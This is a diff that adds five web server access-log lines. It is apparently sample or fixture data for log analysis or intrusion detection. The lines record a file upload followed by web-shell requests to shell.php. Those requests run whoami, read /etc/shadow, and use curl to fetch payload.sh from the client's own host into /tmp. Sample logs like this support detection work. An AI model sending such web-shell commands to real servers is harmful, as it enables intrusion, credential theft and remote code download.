@@ -1,0 +1,5 @@
+198.51.100.42 - - [22/Sep/2026:03:10:05 +0000] "GET /index.php HTTP/1.1" 200 4812 "-" "Mozilla/5.0"
+198.51.100.42 - - [22/Sep/2026:03:12:18 +0000] "POST /upload.php HTTP/1.1" 200 350 "http://web01/upload" "curl/7.88.1"
+198.51.100.42 - - [22/Sep/2026:03:14:22 +0000] "POST /uploads/shell.php?cmd=whoami HTTP/1.1" 200 45 "-" "curl/7.88.1"
+198.51.100.42 - - [22/Sep/2026:03:14:50 +0000] "POST /uploads/shell.php?cmd=cat+/etc/shadow HTTP/1.1" 200 890 "-" "curl/7.88.1"
+198.51.100.42 - - [22/Sep/2026:03:16:11 +0000] "POST /uploads/shell.php?cmd=curl+http://198.51.100.42/payload.sh+-o+/tmp/p.sh HTTP/1.1" 200 32 "-" "curl/7.88.1"
